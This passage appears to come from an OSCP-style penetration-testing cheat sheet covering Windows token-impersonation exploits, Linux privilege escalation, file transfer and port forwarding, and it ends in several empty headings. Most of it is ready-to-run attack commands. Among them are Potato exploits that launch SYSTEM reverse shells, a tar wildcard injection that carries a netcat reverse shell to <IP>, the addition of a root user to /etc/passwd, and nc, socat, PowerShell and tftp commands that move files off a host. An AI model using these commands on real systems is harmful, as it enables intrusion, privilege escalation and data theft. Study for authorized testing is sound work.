3. Run the exploit: ```.\potato.exe -ip <IP> -cmd "C:\temp\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true```
4. Wait for a Windows Defender update, or trigger one manually.

### Token impersonation
#### Service accounts
We briefly talked about service accounts at the start of the course. Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly. Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

#### Rotten potato
The original Rotten Potato exploit was identified in 2016. Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.

**SeImpersonate / SeAssignPrimaryToken**
Service accounts are generally configured with these two privileges. They allow the account to impersonate the access tokens of other users (including the SYSTEM user). Any user with these privileges can run the token impersonation exploits in this lecture.

#### Juicy potato
- https://github.com/ohpe/juicy-potato
Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.

#### Run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob
```
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

#### Rogue potato
- https://github.com/antonioCoco/RoguePotato
- https://github.com/antonioCoco/RoguePotato/releases

#### use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
```
C:\temp\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\temp\reverse.exe
```

#### Now run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges 
```
C:\PrivEsc\RoguePotato.exe -r <IP> –l <PORT> -e "C:\temp\reverse.exe"
```

#### Printspoofer
PrintSpoofer is an exploit that targets the Print Spooler service.
- https://github.com/itm4n/PrintSpoofer

#### Run printspoofer exploit
```
C:\PrivEsc\PrintSpoofer.exe –i -c "C:\temp\reverse.exe"
```

### User privileges
- https://github.com/hatRiot/token-priv
In Windows, user accounts and groups can be assigned specific “privileges”. These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.

#### Check privileges
Note that “disabled” in the state column is irrelevant here. If the privilege is listed, your user has it.
```
whoami /priv
```

- SeImpersonatePrivilege
  - The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain. If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token. The Juicy Potato exploit in a previous section abuses this ability.
- SeAssignPrimaryPrivilege
  - The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege. It enables a user to assign an access token to a new process. Again, this can be exploited with the Juicy Potato exploit.
- SeBackupPrivilege
  -  The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
- seRestorePrivilege
  - The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege: Modify service binaries, Overwrite DLLS used by SYSTEM processes, Modify registery settings
- SeTakeOwnershipPrivilege
  - The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.

## Linux
### General tips
### Tools

### Manual checks
#### Check the current user
```
whoami; id
```

#### Check all the users
```
cat /etc/passwd
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
cat /etc/*release*; cat /etc/*issue*; uname -a; arch
```

#### Check Running processes
```
ps aux
```

#### Check current privileges
```
sudo -l
```

#### Check networking information
```
ifconfig
ip a
routel
```

#### Check open ports
```
netstat -tulpn
```

#### Enumerate firewall
```
cat etc/iptables/*
```

#### Enumerate scheduled task
```
cat /etc/crontab; ls -lah /etc/cron*
```

#### Installed applications and patch levels
```
dpkg -l
```

#### Readable/writable files and directories
```
find / -writable -type d 2>/dev/null
```

#### Unmounted disks
```
cat /etc/fstab
mount
/bin/lsblk
mountvol
```

#### Device drivers and kernal modules
```
lsmod
/sbin/modinfo <MODULE>
```

#### Find suit bits
```
find / -perm -u=s -type f 2>/dev/null
```
#### Run SUID BIT
Use the following instead of just sudo <PROGRAM>
```
sudo -u root <PATH TO PROGRAM> #manier1
./.suid_bash -p #manier2
```

#### Exploiting path on binary
If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
```
echo /bin/bash > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
<path to binary>
```
  
#### Wildcard privileges
Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```
echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

#### Man pages
As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
```
!/bin/bash
```
 
#### SUID nmap
```
nmap --interactive
!sh
whoami
#root
```
  
### Privesc Linux Tricks
#### Write to /etc/passwd
```
openssl passwd <PASS> #generate password
echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 #sudo to root with the password set
```

## File transfers
### Download files
#### Start webservers
```
sudo service apache2 start #files in /var/www/html
sudo python3 -m http.server <PORT> #files in current 
sudo python2 -m SimpleHTTPServer <PORT>
sudo php -S 0.0.0.0:<PORT>
sudo ruby -run -e httpd . -p <PORT>
sudo busybox httpd -f -p <PORT>
```

#### Download file from webserver
```
wget http://<IP>:<PORT>/<FILE>
```

#### SMB Server
```
sudo python3 /opt/oscp/impacket/examples/smbserver.py <SHARE NAME> <PATH>
```

#### Look for files in SMB
```
dir \\<IP>\<SHARE NAME>
```

#### Copy files in SMB
```
copy \\<IP>\<SHARE NAME>\<FILE NAME>
```

#### Linux ftp
```
If installed use the ftp package
```

#### Windows ftp
Use native program with the -s parameter to use a input file for the commands
```
echo open <IP> 21> ftp.txt
echo USER <USER> >> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

#### VBS download files for Windows XP
Create vbs script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file
```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

#### Powershell download file
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
```
```
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
```

### Upload files
#### Netcat listener for file
```
nc -nlvp 4444 > <FILE>
```

#### Netcat send file
```
nc -nv 10.11.0.22 4444 <FILE>
```

#### Socat listener for file
```
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
```

#### Socat send file
```
socat TCP4:<IP>:<PORT> file:<FILE>,create
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

#### Upload Windows data through HTTP Post request
make /var/www/upload.php on kali
```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

#### Upload through tftp (over udp)
Install tftp on kali
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows client to send file
```
tftp -i 10.11.0.4 put important.docx
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

## Lateral movement
### Local Port forwarding
#### Port forwarding rinetd
```
apt install rinetd
cat /etc/rinetd.conf
```

#### SSH local port forward
```
ssh -N -L <LOCAP ORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
```

#### SSH port forwarding over hop
```
ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
```
### Remote port forwarding
#### SSH forward local port of target back to our kali
```
ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<IP>
```

### Dynamic port forwarding
```
sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
vim  /etc/proxychains.conf
socks4		127.0.0.1 9000 #Change this value
#prepend proxychains command before every command to send through the proxychain.
```

#### Port forwarding plink.exe
```
plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>
```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

